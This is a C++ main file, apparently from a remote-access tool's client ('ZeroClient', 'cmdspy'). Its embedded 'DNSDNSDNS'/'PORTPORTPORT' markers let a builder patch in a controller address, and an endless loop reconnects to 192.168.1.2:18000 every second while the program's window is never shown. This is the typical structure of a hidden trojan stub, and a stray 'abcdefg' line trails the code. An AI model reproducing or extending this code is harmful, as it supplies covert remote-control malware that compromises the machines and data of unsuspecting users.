#include "mainwindow.h"
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include "zeroclient.h"
#include "cmdspy.h"

#include <QApplication>

// 自定义客户端连向的域名和端口
const int gOffsetDomain = 10;
const char gDomain[100] = "DNSDNSDNS:192.168.1.2 ";
const int gOffsetPort = 13;
const char gPort[100] = "PORTPORTPORT:18000 ";

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;
    // 初始化Windows socket功能，要在Windows使用网络必须初始化这个
    WSAData wsaData;
    if (WSAStartup(MAKEWORD(2,1), &wsaData)) {
        std::cout << "Failed to initialize WSA" << std::endl;
        return -1;
    }


    // 主循环
    ZeroClient client;
    //client.hInst = hInstance;
    while (1) {
        // 如果断开了，隔一秒自动连接
        char domain[100] = {0};
        char *domainStartPos = (char*)gDomain+gOffsetDomain;
        char *domainStopPos = strchr(domainStartPos, ' ');
        memcpy(domain, domainStartPos, domainStopPos-domainStartPos);
        client.connectTo(domain, atoi(gPort+gOffsetPort));
        Sleep(1000);
    }

    // 程序完结后释放WSA
    WSACleanup();

    w.show();
    return a.exec();
}

abcdefg
